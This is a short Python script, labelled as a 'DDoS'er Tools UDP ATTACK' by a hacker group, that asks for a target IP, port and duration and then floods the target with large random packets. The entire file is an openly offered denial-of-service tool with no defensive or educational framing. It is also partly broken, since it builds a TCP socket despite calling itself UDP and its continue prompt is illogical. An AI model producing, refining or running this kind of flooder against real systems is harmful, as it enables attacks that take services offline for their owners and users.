import socket
import random
import time
from os import system
import sys
import os

socket_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def BANNER():

	print (
		"################################################################################"
		"##                        DDoS'er Tools UDP ATTACK                            ##"
		"##                       Novaliches Security Hackers                          ##"
		"##                       D9rk_9n63lz Security Hackers                         ##"
		"##                        Created by: d9rk_phantom                            ##"
		"##                        Date Created: 09/04/2020                            ##"
		"################################################################################"
		)
	pass
	
def UDP_ATTACK(ip,port,sec):
	i = str(ip)
	p = int(port)
	s = sec
	bufferSize = random._urandom(102400)
	timeout=time.time()+float(s)

	#Check Connection
	try:
		socket_server.connect((i,p))
		print("connected in target")
		con = 1
	except Exception as e: 
		
		con = 0

	#Send Bytes in Target IP
	if con == 1:
		while True:
			if time.time()<timeout:
				print(timeout)
				try:
					socket_server.sendto(bufferSize,(i,p))
					pass
				except Exception as e:
					print (e)
				pass
			else:
				print("Attack Complete")
				OPTION()
				#system('cls')
				#os.system("py ddoser.py")
				break
				pass
			pass
		pass
	else:
		print("error")
		pass
	pass


def MAIN():
	ip_target = input ("Target Ip Adress: ")
	port_target = input ("Target Port: ")
	sec_send_packet = input ("Second to send Packet: ")
	UDP_ATTACK(ip_target,port_target,sec_send_packet)
	pass

def OPTION():
	option = input("Do you want to continue [y/n]: ")
	if option == 'n':
		OPTION()
		pass
	pass

BANNER()

MAIN()